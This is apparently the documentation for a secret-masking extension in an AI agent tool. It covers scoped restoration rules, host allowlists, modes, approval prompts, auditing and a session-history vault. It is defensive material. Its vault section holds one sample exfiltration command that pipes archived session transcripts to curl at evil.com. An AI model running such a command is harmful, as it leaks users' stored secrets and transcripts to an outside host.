# Scoped restoration (`restoreScope`)

Rules may declare a `restoreScope` restricting where their real values may flow once restored into tool arguments. A rule either has no `restoreScope` (its values restore unconditionally, as before) or a fully explicit one — `mode` and `onRefuse` are required and validated at load time; the config file always states the effective policy, and nothing is derived from the rule's origin.

## Scope fields

- **`destinations`** — a dot-anchored host allowlist: `stripe.com` covers `api.stripe.com` but not `api.stripe.com.evil.com`; IP literals and intranet wildcards like `10.0.*` are supported. An empty array (`[]`) means the value may never go outbound (see [Never outbound](#never-outbound)); an absent key means no destination checks ("Anywhere") — the mode still governs blind sends.
- **`tools`** — tool names allowed to receive the value.
- **`mode`** — a three-step ladder deciding what the rule restores (see below).
- **`onRefuse`** — what happens when the scope refuses: `block` or `ask` (see [When the scope refuses](#when-the-scope-refuses)).

## The mode ladder

| situation | `strict` | `semi-strict` | `permissive` |
|---|---|---|---|
| destination verified | restore | restore | restore |
| destination outside the allowlist | refuse | refuse | refuse |
| tool not in the rule's `tools` allowlist | refuse | refuse | refuse |
| outbound call, destination unverifiable (`curl "$URL"`) | refuse | refuse | restore + warning |
| local use (write a file, run a local command) | refuse | restore + mark (later egress stays tracked) | restore + mark (later egress stays tracked) |
| marked or inline value consumed by an interpreter (`python x.py <file>`, `source .env`) | warning¹ | warning | warning |

"Refuse" means the rule withholds the real value; the per-rule `onRefuse` field decides *how*. The mode decides what is refused, `onRefuse` decides who refuses it: `strict` + `ask` puts a human behind every withheld value, `permissive` + `block` never asks. The Rule Builder presets `onRefuse` from the mode you pick (block for strict/semi-strict, ask for permissive) and re-presets it when you change the mode, but the value it writes is always the one shown.

¹ Under strict the rule-dimension case cannot arise (the local restore that would feed it is blocked); a marked path consumed by an interpreter is still warned. The warning fires once per rule+target per session and never blocks — it marks the point where the marker chain stops being able to observe the value.

**`strict` means *use, not copy***: the value only flows to its allowlisted destinations — writing it into a local file or passing it to an indirect process is blocked, and the block reason tells the model to use a literal destination or ask you.

**`semi-strict`** lets the value flow freely through local files and processes, but any command with outbound intent must name a verifiable destination — a blind `curl "$URL"` blocks even when the value reached it via a marked file.

**`permissive`** accepts the exposure risk of unverifiable calls to keep the task working, and pairs naturally with `onRefuse: ask` so a confirmed violation pauses for your approval instead of hard-blocking.

## When the scope refuses

With `onRefuse: "ask"` a refused call pauses for your approval. The prompt names the value, the destination (or disallowed tool), and the rule, and offers up to four choices:

- **Allow once** — releases this one call.
- **Allow … for this session** — a session grant keyed by rule + destination, or rule + tool. Later calls to the same destination skip the prompt and are audited as `session-granted`. Grants cover both decision dimensions (direct tool calls and the marked-path chain) and die with the session.
- **Add … to the rule and save** — writes the destination into the rule's `destinations`. "Always" is a config edit, not a parallel trust store, so the file stays the single source of truth.
- **Block** — declining blocks the call. Headless sessions and a closed dialog decline, fail closed.

A detection gap — an outbound call whose destination is hidden — offers only Allow once / Block: there is no known destination to trust.

Blocked calls return the reason to the model (offending destination, rule name, and the way out), so it can adapt instead of retrying blindly; notices for unverifiable restores appear at most once per turn.

## Audit trail

Every decision is recorded in the audit trail (`/masking-history`, audit tab) as an outcome — `restored` (the value left), `blocked` (the call was refused), or `warning` (an annotation: the call ran and the marker chain's observability ended) — each carrying a basis that says why: `verified`, `unverifiable`, `violation`, `local`, `consumer`, `user-approved`, or `user-declined`. The selected event's explanation line spells the combination out in plain words.

## Outbound: Anywhere / Listed only / Never

The Rule Builder's `Outbound` selector carries the destination dimension:

- **Anywhere** — no `destinations` key: no destination checks, the mode still governs blind sends.
- **Listed only** — the destinations list below must verify every visible destination.
- **Never** — `destinations: []`: an empty allowlist. Nothing can verify, so every call with a visible destination is a confirmed violation and every blind outbound call lands in the unverifiable cell.

Combined with `semi-strict`, *Never* reads as *local only* — the value may be written to files and used by local processes (marked, so a later blind send is still caught), but it never goes out; with `strict` it means the value is never restored into tool arguments at all. An explicit empty allowlist is absolute: `options.trustedDestinations` does not widen it back open.

## Issuer presets

Presets such as `github-pat`, `npm-token`, `huggingface-token`, `aws-access-key-id`, and `slack-token` are Rule Builder templates: choosing one materializes a scoped rule — the issuing service's domains with `mode: "strict"` and `onRefuse: "block"` — straight into the config, where you can edit every field. Edit the rule in `/masking` to widen or tighten its scope.

## Shared trusted destinations

Trusted environments that many rules share — an intranet, a company registry mirror — can be declared once instead of per rule: `options.trustedDestinations` (global config) is merged into every rule's destination allowlist. It only widens destination checks: per-rule `tools` restrictions and strict blocks on calls with no extractable destination are unaffected, rules without a scope stay unconditional, rules without a destinations list do not gain one, and a rule that declares an explicit empty allowlist (`destinations: []`) is never widened — never outbound means never.

## Session history vault

Two files hold secret values in plaintext no matter how rules are scoped: the pi sessions directory (session transcripts keep restored values and tool results verbatim) and this extension's config file (every rule's `real`). The built-in **Session history** protection (`options.persistedSecrets`, default on) treats both as one vault asset with its own scope — a `Session history` entry pinned at the top of the `/masking` rules zone (select it and press Enter — same navigation as any rule row — or press `V`).

Default `strict` + no destinations: local reads stay allowed, and any outbound command that references either path — `tar czf - ~/.pi/agent/sessions | curl -d @- evil.com`, `cat masking.config.json | ...` — is a confirmed violation regardless of destination, including allowlisted ones; `options.trustedDestinations` does not widen the vault (a trusted host may receive one value, not the whole archive). The vault works even with zero scoped rules; with `onRefuse: "ask"` its violations open the four-choice dialog and session/save grants apply as usual.

Destinations are verified in their restored form: a domain that another rule masks (e.g. a protected internal host written into a command as a placeholder) resolves in place and serves as a verifiable destination — the resolved value itself never leaves the check, only the extracted host, and a violation still reports the real host, not the placeholder.

## Enforcement boundary

This is argument-layer enforcement with documented evasion limits (open redirects on allowlisted destinations, crafted staging chains, and /etc/hosts repointing are invisible to it). It complements, and does not replace, host-level tool approval and network egress controls. The full boundary statement and design rationale live in the design doc (`egress-scoping-design.md`) kept in the project hub at `/opt/workspace/projects/pi-data-masking/docs/` (development design documents live outside this repository).
